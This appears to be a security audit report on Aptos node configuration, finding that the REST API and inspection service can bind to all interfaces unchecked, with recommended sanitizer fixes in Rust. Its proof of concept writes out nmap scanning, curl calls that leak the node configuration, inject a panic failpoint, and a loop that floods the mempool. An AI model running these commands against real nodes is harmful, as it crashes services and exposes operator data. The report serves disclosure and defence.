# Audit Report

## Title
Insecure Default Configuration: API and Inspection Service Bind to All Network Interfaces Without Validation

## Summary
The ApiConfig and InspectionServiceConfig allow binding to `0.0.0.0` without any validation or warning in the configuration sanitizer, accidentally exposing sensitive internal APIs including failpoint manipulation, node configuration disclosure, and transaction submission endpoints to external attackers. The InspectionServiceConfig compounds this by defaulting to `0.0.0.0` and automatically enabling sensitive endpoints on non-mainnet networks.

## Finding Description

The ApiConfig struct defines a public REST API address field that defaults to `127.0.0.1:8080` (localhost only), but can be overridden to `0.0.0.0:8080` in configuration files without any validation checks. [1](#0-0) [2](#0-1) 

The ConfigSanitizer implementation for ApiConfig validates failpoint usage on mainnet and runtime worker configuration, but critically **does not validate or warn when the address is set to bind to all network interfaces (`0.0.0.0`)**. [3](#0-2) 

This becomes exploitable when operators copy Docker/Kubernetes configuration templates (which use `0.0.0.0` for container networking) to bare-metal or VM deployments without understanding the security implications: [4](#0-3) 

The REST API exposes multiple sensitive endpoints including the failpoint manipulation endpoint: [5](#0-4) [6](#0-5) 

Even more critically, the InspectionServiceConfig **defaults to binding on all interfaces** (`0.0.0.0:9101`) rather than localhost: [7](#0-6) 

The ConfigOptimizer automatically enables all inspection endpoints (including sensitive configuration disclosure) for non-mainnet networks: [8](#0-7) 

This exposes the `/configuration` endpoint which returns the entire node configuration: [9](#0-8) 

**Attack Scenario:**

1. Operator deploys a testnet/devnet validator or fullnode
2. They copy a Docker configuration file that sets `api.address: "0.0.0.0:8080"`
3. They deploy on a VM/bare-metal server without proper firewall rules
4. The inspection service defaults to `0.0.0.0:9101` and ConfigOptimizer auto-enables sensitive endpoints
5. External attacker discovers the exposed ports via network scanning
6. Attacker accesses:
   - `/v1/set_failpoint` to inject crashes or state corruption (if failpoints enabled on testnet)
   - `http://node:9101/configuration` to extract full node configuration including network topology, peer information
   - `/v1/transactions` to flood the mempool with spam transactions
   - Other inspection endpoints to gather intelligence for further attacks

## Impact Explanation

**High Severity** per Aptos bug bounty criteria:

1. **Validator node slowdowns/crashes**: On testnet/devnet with failpoints enabled, attackers can inject arbitrary failpoints causing node crashes, consensus delays, or state corruption testing scenarios in production environments.

2. **API crashes**: Mempool flooding via transaction submission can cause resource exhaustion and API service degradation.

3. **Significant protocol violations**: While not directly breaking consensus on mainnet (due to failpoint protections), this enables reconnaissance and resource exhaustion attacks that violate the expected security posture of validator nodes.

4. **Information disclosure**: The inspection service configuration endpoint exposes sensitive operational details including network topology, peer identities, and node configurations that can aid in planning more sophisticated attacks.

The issue affects:
- All testnet/devnet nodes where failpoints might be enabled for testing
- All nodes where operators copy Docker/K8s configs without understanding network security
- All nodes by default for the inspection service (unless explicitly changed from `0.0.0.0`)

## Likelihood Explanation

**High Likelihood:**

1. **Common misconfiguration**: Operators frequently copy Docker/Kubernetes configuration templates to other deployment environments without understanding the security implications of `0.0.0.0` binding.

2. **Insecure defaults**: The InspectionServiceConfig defaults to `0.0.0.0` rather than `127.0.0.1`, making insecure exposure the default behavior.

3. **Auto-enablement**: The ConfigOptimizer automatically enables sensitive endpoints on non-mainnet networks without operator awareness.

4. **No warnings**: The configuration sanitizer provides no validation, warnings, or documentation about the security risks of binding to all network interfaces.

5. **Widespread deployment**: Testnet and devnet deployments are common for development, testing, and staging environments, increasing attack surface.

## Recommendation

Implement multi-layered validation and security controls:

**1. Add address binding validation to ApiConfig sanitizer:**

```rust
impl ConfigSanitizer for ApiConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let api_config = &node_config.api;

        if !api_config.enabled {
            return Ok(());
        }

        // NEW: Warn about binding to all interfaces
        if api_config.address.ip().is_unspecified() {
            if let Some(chain_id) = chain_id {
                if node_type.is_validator() && (chain_id.is_mainnet() || api_config.failpoints_enabled) {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "API address is bound to all interfaces (0.0.0.0). This exposes internal APIs to external networks. Consider using 127.0.0.1 for localhost-only access, or ensure proper firewall rules are in place.".into(),
                    ));
                }
            }
        }

        // Existing failpoint check...
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }

        // Existing runtime worker validation...
        if api_config.max_runtime_workers.is_none() && api_config.runtime_worker_multiplier == 0 {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "runtime_worker_multiplier must be greater than 0!".into(),
            ));
        }

        GasEstimationConfig::sanitize(node_config, node_type, chain_id)?;

        Ok(())
    }
}
```

**2. Change InspectionServiceConfig default to localhost:**

```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "127.0.0.1".to_string(), // Changed from 0.0.0.0
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
}
```

**3. Add sanitizer validation for InspectionServiceConfig:**

```rust
impl ConfigSanitizer for InspectionServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let inspection_service_config = &node_config.inspection_service;

        // Existing mainnet validator check...
        if let Some(chain_id) = chain_id {
            if node_type.is_validator()
                && chain_id.is_mainnet()
                && inspection_service_config.expose_configuration
            {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Mainnet validators should not expose the node configuration!".to_string(),
                ));
            }
        }

        // NEW: Warn about 0.0.0.0 binding with sensitive endpoints enabled
        if inspection_service_config.address == "0.0.0.0" {
            if inspection_service_config.expose_configuration {
                eprintln!("WARNING: Inspection service is bound to all interfaces (0.0.0.0) with configuration exposure enabled. This may leak sensitive node information to external networks.");
            }
        }

        Ok(())
    }
}
```

**4. Add documentation to configuration files warning about security implications of `0.0.0.0` binding.**

## Proof of Concept

**Setup:**
1. Create a testnet node configuration with exposed API:

```yaml
# testnet_node.yaml
api:
  enabled: true
  address: "0.0.0.0:8080"
  failpoints_enabled: true

inspection_service:
  address: "0.0.0.0"
  port: 9101
  # ConfigOptimizer will auto-enable expose_configuration for testnet
```

2. Deploy the node on a VM accessible from the internet without firewall rules

**Exploitation Steps:**

```bash
# Step 1: Discover exposed node via port scanning
nmap -p 8080,9101 <target_ip>

# Step 2: Extract node configuration (testnet only, auto-enabled)
curl http://<target_ip>:9101/configuration

# Step 3: Inject failpoint to crash the node (if failpoints enabled)
curl "http://<target_ip>:8080/v1/set_failpoint?name=consensus::process_proposal&actions=panic"

# Step 4: Flood mempool with transactions
for i in {1..1000}; do
  curl -X POST http://<target_ip>:8080/v1/transactions \
    -H "Content-Type: application/json" \
    -d '{"sender":"0x1","sequence_number":"0","max_gas_amount":"1000","gas_unit_price":"1","expiration_timestamp_secs":"99999999999","payload":{"type":"entry_function_payload","function":"0x1::aptos_account::transfer","type_arguments":[],"arguments":["0x2","1"]},"signature":{"type":"ed25519_signature","public_key":"0x00","signature":"0x00"}}'
done

# Result: Node crashes, mempool exhausted, configuration leaked
```

**Expected Impact:**
- Node crashes due to failpoint injection (testnet/devnet)
- Mempool becomes saturated with invalid transactions
- Sensitive configuration data exposed to attacker
- Network topology and peer information disclosed

---

## Notes

This vulnerability demonstrates a **defense-in-depth failure** where:
1. Insecure defaults (`0.0.0.0` for inspection service)
2. Lack of validation in configuration sanitizers
3. Auto-enablement of sensitive features (ConfigOptimizer)
4. Insufficient documentation of security implications

While network-layer security (firewalls, VPCs) should be the primary defense, **the application layer should not make insecure configurations easy or default**, especially for critical blockchain infrastructure. The combination of these factors creates a realistic attack scenario where operational mistakes lead to security compromises.

### Citations

**File:** config/src/config/api_config.rs (L95-96)
```rust
const DEFAULT_ADDRESS: &str = "127.0.0.1";
const DEFAULT_PORT: u16 = 8080;
```

**File:** config/src/config/api_config.rs (L115-118)
```rust
            enabled: default_enabled(),
            address: format!("{}:{}", DEFAULT_ADDRESS, DEFAULT_PORT)
                .parse()
                .unwrap(),
```

**File:** config/src/config/api_config.rs (L163-200)
```rust
impl ConfigSanitizer for ApiConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let api_config = &node_config.api;

        // If the API is disabled, we don't need to do anything
        if !api_config.enabled {
            return Ok(());
        }

        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }

        // Validate basic runtime properties
        if api_config.max_runtime_workers.is_none() && api_config.runtime_worker_multiplier == 0 {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "runtime_worker_multiplier must be greater than 0!".into(),
            ));
        }

        // Sanitize the gas estimation config
        GasEstimationConfig::sanitize(node_config, node_type, chain_id)?;

        Ok(())
    }
}
```

**File:** docker/compose/aptos-node/validator.yaml (L44-46)
```yaml
api:
  enabled: true
  address: "0.0.0.0:8080"
```

**File:** api/src/runtime.rs (L247-251)
```rust
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/set_failpoints.rs (L21-40)
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** config/src/config/inspection_service_config.rs (L26-37)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
}
```

**File:** config/src/config/inspection_service_config.rs (L71-109)
```rust
impl ConfigOptimizer for InspectionServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let inspection_service_config = &mut node_config.inspection_service;
        let local_inspection_config_yaml = &local_config_yaml["inspection_service"];

        // Enable all endpoints for non-mainnet nodes (to aid debugging)
        let mut modified_config = false;
        if let Some(chain_id) = chain_id {
            if !chain_id.is_mainnet() {
                if local_inspection_config_yaml["expose_configuration"].is_null() {
                    inspection_service_config.expose_configuration = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_identity_information"].is_null() {
                    inspection_service_config.expose_identity_information = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_peer_information"].is_null() {
                    inspection_service_config.expose_peer_information = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_system_information"].is_null() {
                    inspection_service_config.expose_system_information = true;
                    modified_config = true;
                }
            }
        }

        Ok(modified_config)
    }
}
```

**File:** crates/aptos-inspection-service/src/server/configuration.rs (L12-29)
```rust
/// Handles a new configuration request
pub fn handle_configuration_request(node_config: &NodeConfig) -> (StatusCode, Body, String) {
    // Only return configuration if the endpoint is enabled
    let (status_code, body) = if node_config.inspection_service.expose_configuration {
        // We format the configuration using debug formatting. This is important to
        // prevent secret/private keys from being serialized and leaked (i.e.,
        // all secret keys are marked with SilentDisplay and SilentDebug).
        let encoded_configuration = format!("{:?}", node_config);
        (StatusCode::OK, Body::from(encoded_configuration))
    } else {
        (
            StatusCode::FORBIDDEN,
            Body::from(CONFIGURATION_DISABLED_MESSAGE),
        )
    };

    (status_code, body, CONTENT_TYPE_TEXT.into())
}
```
